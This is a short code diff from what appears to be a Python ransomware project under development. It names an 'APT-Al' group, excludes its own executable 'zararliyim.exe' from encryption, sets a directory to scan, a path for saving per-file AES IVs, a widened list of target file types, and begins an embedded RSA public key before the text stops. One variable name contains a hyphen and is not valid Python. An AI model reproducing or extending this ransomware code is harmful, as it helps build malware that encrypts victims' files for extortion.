@@ -3,17 +3,22 @@ from pwd import getpwuid
 
 whoweare = "APT-Al"
 
-root_directory = os.path.expanduser('~')
-# root_directory = "/home/kali/test"
-# print("Root Directory:", root_directory)
+# prevent self-encryption
+whatismyname = "zararliyim.exe"
+
+# the beginning point of recon
+# root_directory = os.path.expanduser('~')
+root_directory = "/home/kali/test"
+
+# where to write the pairs made up of a file and AES IV
+aesIV-File_store_path = "/home/kali/desktop"
 
 
 os_name = os.name
-# print("OS name:",os_name)
 
 
 # the extensions are ordered so we can use binary search
-file_extentions = ["doc","jpg","png","txt"]
+file_extentions = ['doc', 'exe', 'jpg', 'png', 'txt', 'xlsx']
 
 
 rsa_public_key = "-----BEGIN RSA PUBLIC KEY-----\n\
